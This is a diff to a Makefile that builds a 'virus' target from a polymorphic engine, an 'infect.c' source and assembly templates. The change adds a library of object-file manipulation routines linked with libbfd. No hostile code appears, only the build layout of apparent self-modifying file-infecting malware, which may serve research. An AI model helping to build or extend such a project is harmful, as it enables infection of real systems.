@@ -41,13 +41,13 @@ AFLAGS = -felf64 -g -F dwarf
 CFLAGS = -c  -Wall -O2 -g
 
 LFLAGS = -no-pie 
-KFLAGS = -no-pie -nostartfiles -m64 -g -falign-functions=16
+KFLAGS = -no-pie -nostartfiles -m64 -g -falign-functions=16  -L./lib
 all: virus polymake
 
 polymake: polyengine.o polymorphicengine.o
 	$(GCC) $(LFLAGS) $^ -o $@
 	
-virus: polymorphicengine.c infect.c virus.o   polymorphicengine.o
+virus: polymorphicengine.c infect.c virus.o libobjdata.a  -lobjdata -lbfd
 	$(CC) $(KFLAGS) $^ -o $@
 
 virus.o: virus.asm template.asm.inc
@@ -59,7 +59,10 @@ polyengine.o: polymake.cpp
 polymorphicengine.o: polymorphicengine.asm
 	$(ASM) $(AFLAGS) $< -o $@
 
-
+libobjdata.a: objsect.o objsym.o objcopy.o
+	ar rs libobjdata.a objsect.o objsym.o objcopy.o
+	mkdir -p lib
+	cp -f libobjdata.a lib
 
 
 
